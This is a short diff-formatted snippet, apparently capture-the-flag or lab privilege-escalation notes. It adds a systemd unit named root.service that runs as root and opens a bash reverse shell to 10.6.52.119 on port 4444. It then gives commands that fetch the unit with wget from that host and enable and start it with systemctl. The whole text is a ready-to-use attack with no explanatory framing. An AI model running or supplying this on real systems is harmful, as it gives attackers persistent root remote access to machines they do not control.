@@ -1,0 +1,15 @@
+1 [unit]
+2 Description=root
+3
+4 [Service]
+5 Type=simple
+6 User=root
+7 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.6.52.119/4444 0>&1'
+8
+9 [Install]
+10 WantedBy=multi-user.target
+tao root.service
+
+wget http://10.6.52.119/root.service
+systemctl enable /tmp/root.service
+systemctl start root
